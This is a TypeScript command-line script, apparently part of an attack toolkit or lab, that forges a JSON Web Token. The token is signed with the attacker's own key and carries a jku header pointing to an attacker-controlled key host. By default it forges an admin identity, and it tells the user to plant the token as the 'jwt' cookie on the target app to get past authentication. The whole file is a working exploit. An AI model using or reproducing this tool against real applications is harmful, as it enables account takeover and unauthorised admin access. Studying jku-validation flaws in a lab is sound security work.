import { forgeToken, getJkuUrl } from './sign';

// Builds a JWT signed with the attacker's own private key, with a jku header
// pointing back at our own key host. If the target server doesn't validate
// that jku points somewhere it should trust, this token verifies cleanly.

function getArg(args: string[], name: string, fallback: string): string {
  const idx = args.indexOf(`--${name}`);
  return idx !== -1 && args[idx + 1] ? args[idx + 1] : fallback;
}

function main() {
  // Defaults forge an admin identity matching the target app's admin user
  // (id 1). Override any field: npm run forge -- --role admin --id 1
  const args = process.argv.slice(2);
  const payload = {
    id: Number(getArg(args, 'id', '1')),
    email: getArg(args, 'email', 'admin.adminson@example.com'),
    firstName: getArg(args, 'firstName', 'Admin'),
    lastName: getArg(args, 'lastName', 'Adminson'),
    role: getArg(args, 'role', 'admin')
  };

  let result;
  try {
    result = forgeToken(payload, getJkuUrl());
  } catch (err) {
    console.error(err instanceof Error ? err.message : err);
    process.exit(1);
  }

  console.log('Forged token - set this as the value of the "jwt" cookie on the target app:');
  console.log('');
  console.log(result.token);
  console.log('');
  console.log('Header: ', result.header);
  console.log('Payload:', payload);
}

main();
